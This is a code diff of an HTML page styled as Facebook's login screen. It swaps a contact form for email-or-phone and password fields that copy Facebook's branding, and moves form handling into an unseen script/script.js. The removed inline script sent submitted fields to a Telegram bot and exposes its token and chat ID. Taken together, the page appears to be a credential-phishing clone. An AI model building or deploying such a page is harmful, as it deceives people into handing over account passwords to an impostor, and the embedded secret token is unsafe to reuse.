@@ -6,61 +6,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Facebook Login Page</title>
     <link rel="stylesheet" href="css/style.css" />
+    <!-- <script src="script/script.js" defer></script> -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   </head>
   <body>
     <div class="content">
       <div class="flex-div">
         <div class="name-content">
-          <h1 class="logo">Facebook</h1>
+          <h1 class="logo">facebook</h1>
           <p>Connect with friends and the world around you on Facebook.</p>
         </div>
         <form class="form">
-          <input type="text" class="form_input" name="name" placeholder="Name" required />
-          <input type="email" class="form_input" name="email" placeholder="Email" required />
-          <input type="text" class="form_input" name="message" placeholder="Message" required />
-          <br />
+          <input type="text" class="form_input" name="EmailOrPhone" placeholder="Email or phone number" required />
+          <input type="password" class="form_input" name="Password" placeholder="Password" required />
           <button type="submit" class="login form_button">Log In</button>
           <a href="#">Forgot Password?</a>
-          <hr />
+          <hr/>
           <button class="create-account">Create New Account</button>
         </form>
       </div>
+      <p class="business-page"><a class="bsn-a" href="https://web.facebook.com/pages/create/?ref_type=registration_form">Create a Page</a>  for a celebrity, brand or business.</p>
     </div>
-
-    <script>
-      "use strict";
-
-      const form = document.querySelector('.form');
-      form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        sendMessage(form);
-      });
-
-      async function sendMessage(form) {
-        const formData = new FormData(form);
-        const name = formData.get("name");
-        const email = formData.get("email");
-        const message = formData.get("message");
-
-        const content = `<b>Message from Site: </b>\n<b>Name:</b> ${name}\n<b>Email:</b> ${email}\n<b>Message:</b> ${message}`;
-
-        const apiToken = "8155002295:AAGwo21L6VQ0XRrGKSW4Qj9rb116stUuYog";
-        const chatId = "@MaSendMessageBots";
-        const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(content)}&parse_mode=HTML`;
-
-        try {
-          const response = await fetch(url);
-          if (response.ok) {
-            form.reset();
-            alert("Form sent to Telegram!");
-          } else {
-            alert("Error sending form.");
-          }
-        } catch (error) {
-          alert("Network error. Please try again.");
-          console.error("Error:", error);
-        }
-      }
-    </script>
+  <script src="script/script.js"></script>
   </body>
 </html>
